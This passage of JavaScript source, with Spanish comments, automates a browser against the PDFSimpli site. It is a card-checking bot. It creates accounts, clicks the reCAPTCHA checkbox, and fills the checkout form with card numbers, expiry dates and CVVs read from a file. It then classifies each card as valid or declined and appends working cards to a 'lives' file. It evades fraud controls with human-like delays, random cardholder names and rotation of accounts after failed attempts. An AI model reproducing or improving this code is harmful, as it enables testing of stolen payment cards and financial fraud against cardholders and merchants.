                const campos = await this.buscarCamposRegistroCompleto();

                if (!campos || !campos.email || !campos.password) {
                    this.log('❌ No se encontraron campos de registro válidos', 'ERROR');
                    this.cuentaActual.registroFallido = true;
                    this.cuentaActual.ultimoUso = new Date().toISOString();
                    this.guardarCuentas();
                    return false;
                }

                this.log('📝 Completando registro...');
                this.log(`📧 Email: ${this.cuentaActual.email}`);
                this.log(`🔑 Password: ${this.cuentaActual.password}`);

                // Completar email
                try {
                    await campos.email.click({ clickCount: 3 });
                    await this.delay(100);
                    await campos.email.press("Backspace");
                    await this.delay(100);
                    await campos.email.type(this.cuentaActual.email, { delay: 40 });
                } catch (error) {
                    this.log('⚠️ Error completando email, intentando método alternativo...', 'WARNING');
                    await this.page.evaluate((element, email) => {
                        element.value = email;
                        element.dispatchEvent(new Event('input', { bubbles: true }));
                        element.dispatchEvent(new Event('change', { bubbles: true }));
                    }, campos.email, this.cuentaActual.email);
                }

                // Completar password
                try {
                    await campos.password.click({ clickCount: 3 });
                    await this.delay(100);
                    await campos.password.press("Backspace");
                    await this.delay(100);
                    await campos.password.type(this.cuentaActual.password, { delay: 40 });
                } catch (error) {
                    this.log('⚠️ Error completando password, intentando método alternativo...', 'WARNING');
                    await this.page.evaluate((element, password) => {
                        element.value = password;
                        element.dispatchEvent(new Event('input', { bubbles: true }));
                        element.dispatchEvent(new Event('change', { bubbles: true }));
                    }, campos.password, this.cuentaActual.password);
                }

                this.log('✅ Campos de registro completados');

                // Hacer clic en registro
                const registroConfirmado = await this.hacerClicRegistro(10000);
                if (!registroConfirmado) {
                    this.log('❌ No se pudo completar el clic de registro', 'ERROR');
                    this.cuentaActual.registroFallido = true;
                    this.cuentaActual.ultimoUso = new Date().toISOString();
                    this.guardarCuentas();
                    return false;
                }

                await this.delayHumano();

                // Manejar reCAPTCHA si está presente
                await this.manejarRecaptcha();
                await this.delayHumano();

                // Validar registro exitoso
                await this.delay(5000);
                const url = await this.page.url();
                const pageContent = await this.page.content();

                const registroExitoso = (
                    url.includes('pdfsimpli.com') &&
                    !url.includes('signup') &&
                    !url.includes('register') &&
                    !pageContent.toLowerCase().includes('invalid email') &&
                    !pageContent.toLowerCase().includes('email already exists') &&
                    !pageContent.toLowerCase().includes('registration failed') &&
                    !pageContent.toLowerCase().includes('error')
                );

                if (registroExitoso) {
                    this.log('✅ Registro exitoso - redireccionado correctamente', 'SUCCESS');

                    this.cuentaActual.tarjetasProcesadas = 0;
                    this.cuentaActual.exitosas = 0;
                    this.cuentaActual.fallidas = 0;
                    this.cuentaActual.registroFallido = false;
                    this.cuentaActual.ultimoUso = new Date().toISOString();

                    this.guardarCuentas();
                    return true;
                }

                // Detectar errores específicos
                if (pageContent.toLowerCase().includes('email already exists')) {
                    this.log('❌ Email ya existe - cuenta duplicada', 'ERROR');
                } else if (pageContent.toLowerCase().includes('invalid email')) {
                    this.log('❌ Email inválido', 'ERROR');
                } else {
                    this.log('❌ Registro fallido - redirección incorrecta o error desconocido', 'ERROR');
                }

                this.cuentaActual.registroFallido = true;
                this.cuentaActual.ultimoUso = new Date().toISOString();
                this.guardarCuentas();
                return false;

            } catch (error) {
                this.logError(error, 'manejarRegistro');
                if (this.cuentaActual) {
                    this.cuentaActual.registroFallido = true;
                    this.cuentaActual.ultimoUso = new Date().toISOString();
                    this.guardarCuentas();
                }
                return false;
            }
        }, 'manejar registro', 2, 5000);
    }

    async buscarCamposRegistroCompleto() {
        try {
            this.log('🔍 Búsqueda exhaustiva de campos de registro...');
            
            // Estrategia 1: Buscar por type
            let campoEmail = await this.page.$('input[type="email"]');
            let campoPassword = await this.page.$('input[type="password"]');
            
            // Estrategia 2: Buscar por name
            if (!campoEmail) campoEmail = await this.page.$('input[name="email"], input[name="username"], input[name="user"], input[name="login"]');
            if (!campoPassword) campoPassword = await this.page.$('input[name="password"], input[name="pass"], input[name="pwd"], input[name="login-password"]');
            
            // Estrategia 3: Buscar por placeholder
            if (!campoEmail) {
                const inputs = await this.page.$$('input');
                for (const input of inputs) {
                    const placeholder = await input.evaluate(el => el.placeholder?.toLowerCase() || '');
                    if (placeholder && (placeholder.includes('email') || placeholder.includes('correo') || placeholder.includes('username') || placeholder.includes('user'))) {
                        campoEmail = input;
                        break;
                    }
                }
            }
            
            if (!campoPassword) {
                const inputs = await this.page.$$('input');
                for (const input of inputs) {
                    const placeholder = await input.evaluate(el => el.placeholder?.toLowerCase() || '');
                    if (placeholder && (placeholder.includes('password') || placeholder.includes('contraseña') || placeholder.includes('pass') || placeholder.includes('pwd'))) {
                        campoPassword = input;
                        break;
                    }
                }
            }

            // Estrategia 4: Buscar por ID
            if (!campoEmail) campoEmail = await this.page.$('#email, #username, #user, #login, #signup-email');
            if (!campoPassword) campoPassword = await this.page.$('#password, #pass, #pwd, #login-password, #signup-password');
            
            if (campoEmail && campoPassword) {
                this.log('✅ Campos de registro encontrados', 'SUCCESS');
                return { email: campoEmail, password: campoPassword };
            }
            
            this.log('❌ No se pudieron encontrar ambos campos de registro');
            return null;
            
        } catch (error) {
            this.logError(error, 'buscarCamposRegistroCompleto');
            return null;
        }
    }

    async hacerClicRegistro(timeout = 10000) {
        const selectores = [
            { tipo: 'id', valor: '#sign-up' },
            { tipo: 'id', valor: '#register' },
            { tipo: 'id', valor: '#signup' },
            { tipo: 'texto', valor: 'sign up', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'register', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'crear cuenta', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'registrarse', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'signup', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'join', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'create account', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'continuar', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'continue', elemento: 'button, input, div' }
        ];
        
        return await this.clicInteligenteConTimeout(selectores, 'BOTÓN REGISTRO', timeout);
    }

    async manejarRecaptcha() {
        try {
            this.log("🔍 Buscando reCAPTCHA v2 checkbox...");
            await this.delay(2000);

            const anchorFrame = this.page.frames().find(f =>
                f.url().includes("recaptcha/api2/anchor")
            );

            if (!anchorFrame) {
                this.log("✔ No se detectó reCAPTCHA", "SUCCESS");
                return true;
            }

            this.log("🎯 Iframe anchor detectado");

            let realFrame = anchorFrame;
            let anchor = null;

            for (let i = 0; i < 10; i++) {
                for (const frame of this.page.frames()) {
                    if (frame.url().includes("recaptcha") &&
                        await frame.$("#recaptcha-anchor")) {
                        realFrame = frame;
                        anchor = await frame.$("#recaptcha-anchor");
                        break;
                    }
                }
                if (anchor) break;
                await this.delay(500);
            }

            if (!anchor) {
                this.log("❌ No se encontró el anchor REAL (iframe interno)", "ERROR");
                return true;
            }

            this.log("🧩 Anchor interno detectado ✔");

            const yaMarcado = await realFrame.$eval("#recaptcha-anchor", el =>
                el.getAttribute("aria-checked") === "true"
            );

            if (yaMarcado) {
                this.log("✅ reCAPTCHA ya estaba resuelto", "SUCCESS");
                return true;
            }

            const box = await anchor.boundingBox();
            if (!box) {
                this.log("❌ Error obteniendo boundingBox", "ERROR");
                return true;
            }

            this.log(`📍 Coordenadas: (${Math.round(box.x + box.width / 2)}, ${Math.round(box.y + box.height / 2)})`);
            this.log("🖱 Enviando click humano...");

            await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
            await this.delay(100);
            await this.page.mouse.down();
            await this.delay(80);
            await this.page.mouse.up();

            this.log("⏳ Verificando estado...");
            await this.delay(3000);

            const marcado = await realFrame.$eval("#recaptcha-anchor", el =>
                el.getAttribute("aria-checked") === "true"
            );

            if (marcado) {
                this.log("✅ reCAPTCHA resuelto ✔", "SUCCESS");
                this.estadisticas.recaptchasResueltos++;
                return true;
            }

            this.log("⚠ No se marcó, puede haber challenge", "WARNING");
            
            const challengeFrame = this.page.frames().find(f =>
                f.url().includes("recaptcha/api2/bframe")
            );

            if (challengeFrame) {
                this.log("⚠️ Se abrió challenge de imágenes - continuando después de espera", "WARNING");
                await this.delay(8000);
                this.estadisticas.recaptchasManuales++;
            }

            return true;

        } catch (err) {
            this.logError(err, "manejarRecaptcha");
            return true;
        }
    }

    async hacerClicContinuePlan() {
        const selectores = [
            { tipo: 'id', valor: '#planPageContinueButton' },
            { tipo: 'texto', valor: 'continue', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'continuar', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'next', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'siguiente', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'proceed', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'seleccionar plan', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'select plan', elemento: 'button, input, div' }
        ];
        
        return await this.clicInteligente(selectores, 'CONTINUAR A PAGO', 5000);
    }

    // ============================================================
    // FLUJO COMPLETO CORREGIDO - ORDEN CORRECTO
    // ============================================================

    async ejecutarFlujoCompleto(tarjeta) {
        try {
            this.log(`\n🎯 INICIANDO FLUJO COMPLETO para tarjeta: ${tarjeta.numero}`);
            
            // Paso 1: Navegar al sitio
            this.log('🌐 Navegando a PDFSimpli...');
            await this.page.goto('https://pdfsimpli.com', { 
                waitUntil: 'networkidle2', 
                timeout: 45000 
            });
            await this.delay(5000);
            
            // Ejecutar pasos en el ORDEN CORRECTO
            const pasos = [
                { nombre: "Subir PDF", accion: () => this.subirPDF() },
                { nombre: "Convertir PDF", accion: () => this.hacerClicConvert() },
                { nombre: "Iniciar descarga", accion: () => this.hacerClicDownload() },
                { nombre: "Registro de cuenta", accion: () => this.manejarRegistro() },
                { nombre: "Continuar a página de pago", accion: () => this.hacerClicContinuePlan() },
                { nombre: "Completar información de pago", accion: () => this.completarInformacionPago(tarjeta) }
            ];
            
            for (const paso of pasos) {
                this.log(`\n🔄 EJECUTANDO: ${paso.nombre}`);
                const resultado = await paso.accion();
                
                if (resultado === false) {
                    this.log(`❌ FALLÓ: ${paso.nombre}`, 'ERROR');
                    return false;
                }
                
                this.log(`✅ COMPLETADO: ${paso.nombre}`, 'SUCCESS');
                await this.delay(3000);
            }
            
            // Verificar resultado final
            this.log('\n🔍 VERIFICANDO RESULTADO DEL PAGO...');
            const resultado = await this.verificarResultadoPago(tarjeta);
            
            await this.procesarResultadoTarjeta(tarjeta, resultado);
            
            return resultado;
            
        } catch (error) {
            this.logError(error, 'ejecutarFlujoCompleto');
            return false;
        }
    }

    async completarInformacionPago(tarjeta) {
        return await this.ejecutarConReintentos(async () => {
            try {
                this.log('💳 Iniciando proceso de pago con PagoAuto...');
                await this.delay(3000);

                if (!this.pagoAuto) {
                    this.log('❌ PagoAuto no inicializado', 'ERROR');
                    return false;
                }

                let camposCompletados = 0;
                const camposRequeridos = [];

                this.log('🔢 Completando número de tarjeta...');
                if (await this.pagoAuto.buscarYCompletarTarjeta(tarjeta)) {
                    camposCompletados++;
                    camposRequeridos.push('numero');
                    this.log('✅ Número de tarjeta completado', 'SUCCESS');
                } else {
                    this.log('❌ No se pudo completar número de tarjeta', 'ERROR');
                }

                await this.delay(1000);

                this.log('👤 Completando nombre del titular...');
                const nombre = this.generarNombreAleatorio();
                if (await this.pagoAuto.buscarYCompletarNombre(nombre)) {
                    camposCompletados++;
                    camposRequeridos.push('nombre');
                    this.log(`✅ Nombre completado: ${nombre}`, 'SUCCESS');
                } else {
                    this.log('⚠️ No se pudo completar nombre', 'WARNING');
                }

                await this.delay(1000);

                this.log('📅 Completando fecha de expiración...');
                if (await this.pagoAuto.buscarYCompletarFecha(tarjeta)) {
                    camposCompletados++;
                    camposRequeridos.push('fecha');
                    this.log('✅ Fecha de expiración completada', 'SUCCESS');
                } else {
                    this.log('❌ No se pudo completar fecha', 'ERROR');
                }

                await this.delay(1000);

                this.log('🔐 Completando CVV...');
                if (await this.pagoAuto.buscarYCompletarCVV(tarjeta.cvv)) {
                    camposCompletados++;
                    camposRequeridos.push('cvv');
                    this.log('✅ CVV completado', 'SUCCESS');
                } else {
                    this.log('❌ No se pudo completar CVV', 'ERROR');
                }

                await this.delay(1000);

                this.log('✅ Marcando términos y condiciones...');
                if (await this.pagoAuto.marcarTerminos()) {
                    camposCompletados++;
                    camposRequeridos.push('terminos');
                    this.log('✅ Términos aceptados', 'SUCCESS');
                } else {
                    this.log('❌ No se pudo marcar términos y condiciones', 'ERROR');
                }

                this.log(`📊 Campos completados: ${camposCompletados}/5 - ${camposRequeridos.join(', ')}`);

                const exito = camposRequeridos.includes('numero') && 
                              camposRequeridos.includes('cvv') && 
                              camposRequeridos.includes('terminos') &&
                              camposCompletados >= 4;

                if (exito) {
                    this.log('✅ Información de pago completada exitosamente', 'SUCCESS');
                    
                    await this.delay(2000);
                    
                    this.log('🔄 Procediendo al pago final...');
                    if (await this.hacerClicPago()) {
                        this.log('✅ Proceso de pago iniciado correctamente', 'SUCCESS');
                        return true;
                    } else {
                        this.log('❌ No se pudo iniciar el proceso de pago', 'ERROR');
                        return false;
                    }
                } else {
                    this.log('❌ Información de pago incompleta - no se puede proceder al pago', 'ERROR');
                    return false;
                }

            } catch (error) {
                this.logError(error, 'completarInformacionPago');
                return false;
            }
        }, 'completar información de pago', 2, 3000);
    }

    async hacerClicPago() {
        return await this.ejecutarConReintentos(async () => {
            this.log('🔄 Buscando botón de pago final...');

            const selectorPrincipal = '#btnChargeebeeSubmit';

            try {
                const botonPago = await this.page.$(selectorPrincipal);

                if (botonPago) {
                    this.log('✅ Botón encontrado: #btnChargeebeeSubmit');

                    await botonPago.evaluate(el => el.scrollIntoView({ behavior: 'smooth', block: 'center' }));
                    await this.delay(800);

                    try {
                        await botonPago.click({ delay: 50 });
                        this.log("🔥 click() tradicional ejecutado");
                        await this.delay(3000);
                        return true;
                    } catch (_) {}

                    try {
                        await this.page.evaluate((sel) => {
                            const btn = document.querySelector(sel);
                            const ev = new MouseEvent('click', { bubbles: true, cancelable: true, view: window });
                            btn.dispatchEvent(ev);
                        }, selectorPrincipal);
                        this.log("🔥 click() humano simulado ejecutado");
                        await this.delay(3000);
                        return true;
                    } catch (_) {}

                    try {
                        await this.page.evaluate((sel) => {
                            const btn = document.querySelector(sel);
                            btn.dispatchEvent(new MouseEvent('mousedown', { bubbles: true }));
                            btn.dispatchEvent(new MouseEvent('mouseup', { bubbles: true }));
                        }, selectorPrincipal);
                        this.log("🔥 mousedown/mouseup ejecutado");
                        await this.delay(3000);
                        return true;
                    } catch (_) {}
                }
            } catch (error) {
                this.log("❌ Error al buscar por ID principal", "ERROR");
            }

            const frames = this.page.frames();
            for (const frame of frames) {
                try {
                    const btn = await frame.$('#btnChargeebeeSubmit');
                    if (btn) {
                        this.log("🟦 Botón encontrado dentro de iframe");

                        await btn.evaluate(el => el.scrollIntoView());
                        await this.delay(600);
                        await btn.click();
                        await this.delay(3000);
                        return true;
                    }
                } catch (_) {}
            }

            const selectores = [
                "button[type='submit']",
                "input[type='submit']",
                "button[id*='pay']",
                "button[id*='submit']",
                "button",
                "input[type='button']"
            ];

            for (const sel of selectores) {
                try {
                    const btns = await this.page.$$(sel);
                    for (const btn of btns) {
                        const visible = await btn.evaluate(el =>
                            el.offsetParent !== null &&
                            !el.disabled &&
                            window.getComputedStyle(el).visibility !== 'hidden'
                        );
                        if (!visible) continue;

                        await btn.evaluate(el => el.scrollIntoView({ block: "center" }));
                        await this.delay(500);

                        try {
                            await btn.click({ delay: 50 });
                        } catch (_) {
                            await this.page.evaluate(el => el.click(), btn);
                        }

                        this.log(`💥 Botón de pago encontrado y clickeado: ${sel}`);
                        await this.delay(3000);
                        return true;
                    }
                } catch (_) {}
            }

            this.log("💣 Modo Nuclear: forzando click en cualquier submit del DOM…");

            await this.page.evaluate(() => {
                const btn = document.querySelector("button, input[type='submit']");
                if (btn) btn.click();
            });

            await this.delay(3000);
            return true;

        }, 'hacer clic en botón de pago', 2, 3000);
    }

    async verificarResultadoPago(tarjeta) {
        try {
            this.log('⏳ Procesando pago, esperando 10 segundos…');
            await this.delay(10000);

            const modalErrorVisible = await this.page.evaluate(() => {
                const bodyText = (document.body.innerText || "").toLowerCase();

                const contieneTextoError =
                    bodyText.includes("¡error de pago!") ||
                    bodyText.includes("error de pago") ||
                    bodyText.includes("tu pago no pudo ser procesado");

                if (!contieneTextoError) return false;

                const posiblesModales = Array.from(document.querySelectorAll("div"));

                for (const modal of posiblesModales) {
                    const style = window.getComputedStyle(modal);

                    const visible =
                        style.display !== "none" &&
                        style.visibility !== "hidden" &&
                        Number(style.opacity || 1) > 0;

                    if (!visible) continue;

                    const rect = modal.getBoundingClientRect();
                    const esGrande = rect.width > 300 && rect.height > 150;

                    if (esGrande && modal.innerText.toLowerCase().includes("error de pago")) {
                        return true;
                    }
                }

                const botones = Array.from(document.querySelectorAll("button"));
                return botones.some(btn => {
                    const txt = (btn.innerText || "").toLowerCase().trim();
                    return txt === "cerrar" || txt.includes("cerrar");
                });
            });

            if (modalErrorVisible) {
                this.log("🎯 Modal de error detectado y visible");
                return false;
            }

            const currentUrl = await this.page.url();
            const pageSource = await this.page.content();
            const lower = pageSource.toLowerCase();

            this.log(`🔗 URL actual: ${currentUrl}`);
            this.log(`📄 Longitud HTML: ${pageSource.length}`);

            if (currentUrl.includes("pdfsimpli.com/app/billing/confirmation")) {
                this.log("💳💚 ÉXITO URL DIRECTO → TARJETA VÁLIDA");
                this.guardarTarjetaValida(tarjeta);
                return true;
            }

            const bloqueoPago = await this.page.evaluate(() => {
                const t = (document.body.innerText || "").toLowerCase();
                return t.includes("¡error de pago!") ||
                       t.includes("tu pago no pudo ser procesado") ||
                       t.includes("actualizar información de pago");
            });

            if (bloqueoPago) {
                this.log("❌🟥 Panel de Error detectado — TARJETA MALA");
                return false;
            }

            const indicadoresError = [
                "payment error",
                "error de pago",
                "declined",
                "card declined",
                "transaction failed",
                "payment failed",
                "invalid card",
                "tarjeta inválida"
            ];

            if (indicadoresError.some(e => lower.includes(e))) {
                this.log(`❌ Error detectado: tarjeta inválida`);
                return false;
            }

            this.log("❌ No hubo confirmación clara → TARJETA MALA");
            return false;

        } catch (error) {
            this.log(`❌ Error en verificación: ${error.message}`);
            return false;
        }
    }

    async cerrarBotonCloseDespuesDeError() {
        this.log("🔍 Buscando botón 'Cerrar' en modal de error...");

        const selectores = [
            "//button[contains(translate(normalize-space(.), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'cerrar')]",
            "//button[contains(translate(normalize-space(.), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'close')]",
            "//button[contains(@class, 'bg-ps-reskin-radial')]",
            "//button[contains(@class, 'rounded-3xl')]",
            "//button[contains(@data-tracker, 'true')]",
            "//span[contains(text(), '×')]"
        ];

        for (let i = 0; i < selectores.length; i++) {
            const xpath = selectores[i];

            try {
                const botones = await this.page.$x(xpath);
                if (botones.length === 0) continue;

                const boton = botones[0];

                this.log(`👉 Selector encontrado: ${xpath}`);

                const visible = await boton.evaluate(el => {
                    const rect = el.getBoundingClientRect();
                    const style = window.getComputedStyle(el);
                    return (
                        rect.width > 0 &&
                        rect.height > 0 &&
                        style.visibility !== "hidden" &&
                        style.display !== "none"
                    );
                });

                if (!visible) {
                    this.log("⚠️ Botón encontrado pero invisible. Probando siguiente selector...");
                    continue;
                }

                try {
                    this.log("🖱️ Intentando clic normal...");
                    await boton.click({ delay: 50 });
                    await this.delay(800);
                } catch {
                    this.log("⚠️ Falló clic normal, probando clic JS...");
                }

                try {
                    await this.page.evaluate(el => el.click(), boton);
                    await this.delay(800);
                } catch {
                    this.log("⚠️ Falló clic JS, probando clic forzado...");
                }

                try {
                    await this.page.evaluate(el => {
                        el.dispatchEvent(new MouseEvent("mousedown", { bubbles: true }));
                        el.dispatchEvent(new MouseEvent("mouseup", { bubbles: true }));
                        el.dispatchEvent(new MouseEvent("click", { bubbles: true }));
                    }, boton);

                    await this.delay(800);
                } catch {
                    this.log("⚠️ Falló clic forzado");
                }

                const aunVisible = await boton.evaluate(el => {
                    const rect = el.getBoundingClientRect();
                    return rect.width > 0 && rect.height > 0;
                });

                if (!aunVisible) {
                    this.log("✅ Modal cerrado correctamente");
                    return true;
                }

            } catch (err) {
                this.log(`⚠️ Error con selector ${xpath}: ${err.message}`);
            }
        }

        this.log("❌ No fue posible cerrar el modal con ningún método.");
        return false;
    }

    async procesarResultadoTarjeta(tarjeta, exito) {
        if (exito) {
            this.guardarTarjetaValida(tarjeta);
            this.log(`🎉 TARJETA VÁLIDA: ${tarjeta.numero}`, 'SUCCESS');

            this.cuentaActual.validada = true;
            this.cuentaActual.exitosas++;
            return;
        }

        this.log(`❌ Tarjeta inválida: ${tarjeta.numero}`, 'ERROR');

        this.cuentaActual.fallidas++;
        this.cuentaActual.tarjetasProcesadas++;

        if (!this.cuentaActual.validada && this.cuentaActual.tarjetasProcesadas >= 3) {
            const bloqueo = new Date(Date.now() + 86400000);
            this.cuentaActual.bloqueadaHasta = bloqueo.toISOString();
            this.log(`⏰ Cuenta bloqueada 24h: ${bloqueo.toLocaleString()}`, 'WARNING');
        }

        await this.cerrarBotonCloseDespuesDeError();
    }

    async procesoConTarjetaRapido(tarjetaActual, iteracion) {
        try {
            this.log(`⚡ Procesando tarjeta rápida #${iteracion}`);

            if (iteracion >= 2) {
                this.log("🧹 Limpiando campos antes de siguiente tarjeta…");
                await this.pagoAuto.limpiarCamposParaNuevaTarjeta();
                await this.delay(800);
            }

            const nombre = this.generarNombreAleatorio();
            const nombreCompletado = await this.pagoAuto.buscarYCompletarNombre(nombre);

            if (nombreCompletado) {
                this.log(`✅ Nombre completado: ${nombre}`);
            } else {
                this.log("⚠️ No se pudo completar el nombre (continuando…)");
            }

            this.log("🔢 Completando número de tarjeta…");
            if (!await this.buscarYCompletarCampoTarjetaCorregido(tarjetaActual)) {
                this.log("❌ Falló completar número de tarjeta", "ERROR");
                return false;
            }

            this.log("🔐 Completando CVV…");
            if (!await this.buscarYCompletarCvvCorregido(tarjetaActual)) {
                this.log("❌ Falló completar CVV", "ERROR");
                return false;
            }

            this.log("🟦 Haciendo clic en el botón de pago…");
            if (!await this.hacerClicBotonObtenerDocumento()) {
                this.log("❌ Falló clic en el botón de pago", "ERROR");
                return false;
            }

            this.log("✅ Proceso rápido completado con éxito");
            return true;

        } catch (err) {
            this.log(`❌ Error en proceso rápido: ${err.message}`, "ERROR");
            return false;
        }
    }

    async ejecutarFlujoTarjetaRapido(tarjetaActual, indice) {
        try {
            this.log(`🔄 Iniciando flujo rápido para tarjeta ${indice + 1}`);

            const exitoProceso = await this.procesoConTarjetaRapido(tarjetaActual, indice + 1);
            if (!exitoProceso) return false;

            const resultado = await this.verificarResultadoPago(tarjetaActual);
            
            await this.procesarResultadoTarjeta(tarjetaActual, resultado);
            
            return resultado;

        } catch (err) {
            this.log(`❌ Error en flujo rápido: ${err.message}`, 'ERROR');
            return false;
        }
    }

    async buscarYCompletarCampoTarjetaCorregido(tarjetaActual) {
        try {
            const frames = await this.page.frames();
            if (frames.length > 1) {
                const frame = frames[1];
                const selectors = ["#data", "input[name='cardNumber']"];
                for (const sel of selectors) {
                    const campo = await frame.$(sel);
                    if (campo) {
                        await campo.click({ clickCount: 3 });
                        await campo.type(tarjetaActual.numero, { delay: 40 });
                        return true;
                    }
                }
            }
            return await this.buscarYCompletarCampoTarjetaFallback(tarjetaActual);
        } catch (err) {
            return await this.buscarYCompletarCampoTarjetaFallback(tarjetaActual);
        }
    }

    async buscarYCompletarCampoTarjetaFallback(tarjetaActual) {
        const frames = await this.page.frames();
        for (const frame of frames) {
            const selectors = ["#data", "input[name='cardNumber']", "input[placeholder*='card']"];
            for (const sel of selectors) {
                try {
                    const campo = await frame.$(sel);
                    if (campo) {
                        await campo.click({ clickCount: 3 });
                        await campo.type(tarjetaActual.numero, { delay: 40 });
                        return true;
                    }
                } catch (e) {
                    continue;
                }
            }
        }
        return false;
    }

    async buscarYCompletarCvvCorregido(tarjetaActual) {
        try {
            const frames = await this.page.frames();
            if (frames.length > 6) {
                const frame = frames[6];
                const selector = "input[maxlength='4'][id='data'], input[maxlength='4'][name='Data']";
                const campo = await frame.$(selector);
                if (campo) {
                    await campo.click({ clickCount: 3 });
                    await campo.type(tarjetaActual.cvv, { delay: 40 });
                    return true;
                }
            }
            return await this.buscarYCompletarCvvFallback(tarjetaActual);
        } catch (err) {
            return await this.buscarYCompletarCvvFallback(tarjetaActual);
        }
    }

    async buscarYCompletarCvvFallback(tarjetaActual) {
        const frames = await this.page.frames();
        for (const frame of frames) {
            const selectors = ["input[maxlength='3']", "input[maxlength='4']", "input[placeholder*='cvv']"];
            for (const sel of selectors) {
                try {
                    const campo = await frame.$(sel);
                    if (campo) {
                        await campo.click({ clickCount: 3 });
                        await campo.type(tarjetaActual.cvv, { delay: 40 });
                        return true;
                    }
                } catch (e) {
                    continue;
                }
            }
        }
        return false;
    }

    async hacerClicBotonObtenerDocumento() {
        const selectores = [
            "#btnChargeebeeSubmit",
            "button#btnChargeebeeSubmit",
            "button[type='submit']",
            "input[type='submit']",
            "//button[contains(text(), 'GET MY DOCUMENT')]",
            "//button[contains(text(), 'Obtener mi documento')]",
            "//button[contains(text(), 'Pagar')]",
            "//button[contains(text(), 'Pay')]"
        ];
        
        for (const sel of selectores) {
            try {
                let boton;
                if (sel.startsWith("//")) {
                    const elementos = await this.page.$x(sel);
                    if (elementos.length > 0) boton = elementos[0];
                } else {
                    boton = await this.page.$(sel);
                }
                
                if (boton) {
                    const isVisible = await boton.evaluate(el =>
                        el.offsetParent !== null && !el.disabled && getComputedStyle(el).visibility !== 'hidden'
                    );
                    if (!isVisible) continue;

                    await boton.evaluate(el => el.scrollIntoView({ behavior: 'smooth', block: 'center' }));
                    await this.delay(500);
                    
                    try {
                        await boton.click();
                    } catch {
                        await this.page.evaluate(el => el.click(), boton);
                    }
                    
                    await this.delay(3000);
                    return true;
                }
            } catch {
                continue;
            }
        }
        return false;
    }

    generarNombreAleatorio() {
        const nombres = ["Juan", "Maria", "Carlos", "Ana", "Luis", "Laura"];
        const apellidos = ["Garcia", "Rodriguez", "Gonzalez", "Fernandez", "Lopez"];
        return `${nombres[Math.floor(Math.random() * nombres.length)]} ${apellidos[Math.floor(Math.random() * apellidos.length)]}`;
    }

    leerTarjetas() {
        try {
            if (!fs.existsSync(this.archivoTarjetas)) {
                this.log('❌ No existe archivo de tarjetas', 'ERROR');
                return [];
            }

            const data = fs.readFileSync(this.archivoTarjetas, 'utf8');
            const lineas = data.split('\n');
            const tarjetas = [];

            for (const linea of lineas) {
                const limpia = linea.trim();
                if (limpia && !limpia.startsWith('#')) {
                    const partes = limpia.split('|');
                    if (partes.length === 4) {
                        tarjetas.push({
                            numero: partes[0].trim(),
                            mes: partes[1].trim(),
                            anio: partes[2].trim(),
                            cvv: partes[3].trim()
                        });
                    }
                }
            }

            this.log(`✅ ${tarjetas.length} tarjetas cargadas`);
            return tarjetas;
        } catch (error) {
            this.logError(error, 'leerTarjetas');
            return [];
        }
    }

    eliminarTarjetaDelArchivo(tarjeta) {
        try {
            if (!fs.existsSync(this.archivoTarjetas)) return false;
            
            const data = fs.readFileSync(this.archivoTarjetas, 'utf8');
            const lineas = data.split('\n');
            const tarjetaStr = `${tarjeta.numero}|${tarjeta.mes}|${tarjeta.anio}|${tarjeta.cvv}`;
            
            const nuevasLineas = lineas.filter(linea => {
                const limpia = linea.trim();
                return !(limpia && !limpia.startsWith('#') && limpia === tarjetaStr);
            });
            
            fs.writeFileSync(this.archivoTarjetas, nuevasLineas.join('\n'), 'utf8');
            this.log(`🗑️ Tarjeta eliminada: ${tarjeta.numero.substring(0, 8)}...`);
            return true;
            
        } catch (error) {
            this.logError(error, 'eliminarTarjetaDelArchivo');
            return false;
        }
    }

    guardarTarjetaValida(tarjeta) {
        try {
            const linea = `${tarjeta.numero}|${tarjeta.mes}|${tarjeta.anio}|${tarjeta.cvv}|${new Date().toLocaleString()}\n`;
            fs.appendFileSync(this.archivoLives, linea, 'utf8');
            this.log(`💾 TARJETA VÁLIDA GUARDADA: ${tarjeta.numero}`, 'SUCCESS');
            this.estadisticas.tarjetasValidas++;
            return true;
        } catch (error) {
            this.logError(error, 'guardarTarjetaValida');
            return false;
        }
    }

    // ============================================================
    // FLUJO PRINCIPAL CORREGIDO
    // ============================================================

    async ejecutarProcesoCompleto() {
        try {
            const tarjetas = this.leerTarjetas();
            if (tarjetas.length === 0) return;

            this.log(`\n🚀 INICIANDO PROCESO CON ${tarjetas.length} TARJETAS`);
            this.log('⚙ REGLAS: validada → nunca más | 3 fallos → 24h bloqueo');

            let tarjetasProcesadas = 0;
            let cuentaIndex = 0;

            while (tarjetasProcesadas < tarjetas.length) {

                if (!this.browser) {
                    if (!await this.iniciarNavegador()) break;
                }

                this.cuentaActual = this.obtenerProximaCuenta();
                if (!this.cuentaActual) {
                    this.log('❌ No hay cuentas disponibles', 'ERROR');
                    break;
                }

                this.log(`\n🔐 Usando cuenta ${++cuentaIndex}: ${this.cuentaActual.email}`);
                this.log(`📊 Estado: ${this.cuentaActual.tarjetasProcesadas}/3 fallos`, 'INFO');

                let cuentaValido = false;
                let intentos = 0;

                while (intentos < 3 && tarjetasProcesadas < tarjetas.length && !cuentaValido) {
                    const tarjeta = tarjetas[tarjetasProcesadas];

                    if (!tarjeta) break;

                    if (intentos === 0) {
                        this.log(`🔰 PRIMERA TARJETA: ${tarjeta.numero}`);
                        const exito = await this.ejecutarFlujoCompleto(tarjeta);
                        await this.procesarResultadoTarjeta(tarjeta, exito);
                        if (exito) {
                            cuentaValido = true;
                        } else {
